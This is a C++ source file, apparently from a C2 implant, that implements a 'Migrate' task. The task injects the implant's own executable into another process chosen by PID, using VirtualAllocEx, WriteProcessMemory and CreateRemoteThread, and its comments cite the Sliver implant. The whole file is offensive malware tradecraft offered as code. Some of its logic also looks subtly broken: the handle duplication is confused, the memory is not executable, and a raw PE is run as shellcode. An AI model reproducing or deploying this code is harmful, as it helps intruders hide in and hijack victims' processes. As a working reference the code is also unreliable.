#include "core/task.hpp"

typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;

namespace Task
{
    // Reference:
    // https://github.com/BishopFox/sliver/blob/master/implant/sliver/taskrunner/task_windows.go#L135
    std::wstring Migrate(const std::wstring& wPid)
    {
        DWORD dwPid = Utils::Convert::WstringToDWORD(wPid, 10);

        HANDLE hCurrProcess = GetCurrentProcess();

        // Get the current process executable file name to migrate.
        WCHAR execName[MAX_PATH*4];
        LPCWSTR lpExecPath;

        DWORD dwFileLen = GetProcessImageFileNameW(
            hCurrProcess,
            const_cast<LPWSTR>(execName),
            MAX_PATH*4
        );
        if (dwFileLen == 0)
        {
            return L"Error: Failed to get the current process executable file name.";
        }

        // Get full path for the executable file.
        lpExecPath = PathFindFileNameW((LPCWSTR)execName);

        // Read the executable file data to write process memory.
        std::vector<BYTE> bytes = System::Fs::ReadBytesFromFile(std::wstring(lpExecPath));
        SIZE_T dataSize = bytes.size();

        // Open target process to migrate.
        HANDLE hTargetProcess = OpenProcess(PROCESS_DUP_HANDLE, FALSE, dwPid);
        if (!hTargetProcess)
        {
            return L"Error: Could not open the target process.";
        }

        HANDLE hDuplProcess;

        DuplicateHandle(
            hTargetProcess,
            hCurrProcess,
            hCurrProcess,
            &hDuplProcess,
            0,
            FALSE,
            DUPLICATE_SAME_ACCESS
        );

        // Inject the executable data to the duplicated process.
        LPVOID lpRemoteAddr = VirtualAllocEx(
            hDuplProcess,
            NULL,
            dataSize,
            MEM_COMMIT,
            PAGE_READWRITE // PAGE_EXECUTE_READWRITE
        );

        SIZE_T dwWritten;
        if (!WriteProcessMemory(
            hDuplProcess,
            lpRemoteAddr,
            bytes.data(),
            dataSize,
            &dwWritten
        ) || dwWritten != dataSize) {
            return L"Error: Failed to write target process memory.";
        }

        HANDLE hThread = CreateRemoteThread(
            hDuplProcess,
            NULL,
            0,
            (LPTHREAD_START_ROUTINE)lpRemoteAddr,
            NULL,
            0,
            NULL
        );
        if (!hThread)
        {
            return L"Error: Failed to create remote thread on the target process.";
        }

        // Terminate the current (original) process.
        // if (!TerminateProcess(hCurrProcess, EXIT_SUCCESS))
        // {
        //     return L"Error: Failed to terminate the current process.";
        // }

        return L"Success: Migrated successfully.";
    }
}
